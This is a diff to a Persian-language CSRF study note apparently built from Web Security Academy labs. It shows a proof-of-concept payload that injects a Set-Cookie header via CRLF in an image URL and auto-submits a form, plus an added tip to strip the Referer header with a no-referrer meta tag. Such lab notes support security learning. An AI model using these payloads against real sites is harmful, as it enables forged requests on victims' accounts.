@@ -21,6 +21,10 @@
 ```HTML
 <img src="https://acbd1fe91ead2563c00539b4008c0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TwzBeSszkg9tjKT3u97crNV7yWLVl0iU" onerror="document.forms[0].submit()">
 ``` 
+ - اگر مقدار Referrer چک شود، می توانیم با اضافه کردن HTML زیر به PoC، هدر Referrer را حذف کنیم تا این بررسی بای پاس شود
+```HTML
+<meta name="referrer" content="no-referrer"> 
+```
  - س
 
 ## Burp
